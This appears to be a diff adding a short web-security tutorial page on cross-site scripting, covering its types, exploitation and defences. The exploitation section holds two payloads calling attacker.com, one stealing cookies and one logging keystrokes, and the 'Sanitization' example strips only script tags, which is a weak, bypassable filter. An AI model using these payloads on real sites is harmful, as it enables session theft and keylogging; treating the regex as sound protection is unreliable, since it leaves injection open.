@@ -1,0 +1,100 @@
+---
+title: "XSS (Cross-Site Scripting)"
+category: "web-security"
+description: "Complete guide on XSS: types (Reflected, Stored, DOM-based), exploitation, protection (CSP, sanitization)"
+coverImage: "/guides/xss.jpg"
+date: "2024-03-13"
+---
+
+# XSS (Cross-Site Scripting)
+
+XSS is a vulnerability that allows an attacker to inject malicious JavaScript code into a web page viewed by other users.
+
+## XSS Types
+
+### Reflected XSS
+
+The script is immediately reflected in the HTTP response. The attacker must convince the victim to click a malicious link.
+
+**Example:**
+```javascript
+// Malicious URL
+https://site.com/search?q=<script>alert('XSS')</script>
+```
+
+### Stored XSS
+
+The script is stored on the server (database) and executed on each display. More dangerous as it affects all users.
+
+**Example:**
+```javascript
+// Stored comment
+<script>document.cookie</script>
+```
+
+### DOM-based XSS
+
+The script modifies the DOM on the client side without server interaction. Harder to detect.
+
+## Exploitation
+
+### Cookie Theft
+
+```javascript
+<script>
+document.location='http://attacker.com/steal?cookie='+document.cookie
+</script>
+```
+
+### Keylogging
+
+```javascript
+<script>
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+}
+</script>
+```
+
+## Protection
+
+### Content Security Policy (CSP)
+
+Define which resources can be loaded:
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+### Sanitization
+
+Sanitize all user inputs:
+
+```javascript
+const sanitize = (input) => {
+    return input.replace(/<script[^>]*>.*?<\/script>/gi, '');
+};
+```
+
+### Encoding
+
+Encode outputs according to context:
+- HTML: `&lt;`, `&gt;`
+- JavaScript: `\x3C`
+- URL: `%3C`
+
+## Best Practices
+
+- Validate and sanitize all inputs
+- Encode all outputs
+- Implement CSP
+- Use secure frameworks
+- Regularly test with tools like OWASP ZAP
+
+## Conclusion
+
+XSS is a critical vulnerability. The combination of validation, sanitization, encoding and CSP provides robust protection.
+
+
+
+
